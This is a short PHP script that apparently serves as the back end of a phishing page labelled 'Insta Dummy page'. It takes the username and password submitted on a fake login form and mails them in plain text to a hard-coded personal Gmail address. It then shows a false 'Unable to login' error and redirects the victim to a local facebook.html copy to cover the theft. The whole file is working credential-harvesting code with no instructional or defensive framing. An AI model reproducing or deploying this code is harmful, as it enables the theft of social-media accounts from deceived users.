<?php

// Variable settings
$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)

$subject = "Someone Login ! Insta Dummy page";
$to = "ariyanpatowary8@gmail.com";

$txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i) username [break] (ii) password;

// Check input fields
if (!empty($username) and !empty($passcode)) {

    mail($to, $subject, $txt);
    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
        window.location.replace('http://127.0.0.1:5500/facebook.html');
        </script>";

} else {

    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
        window.history.go(-1);
        </script>";
}
?>
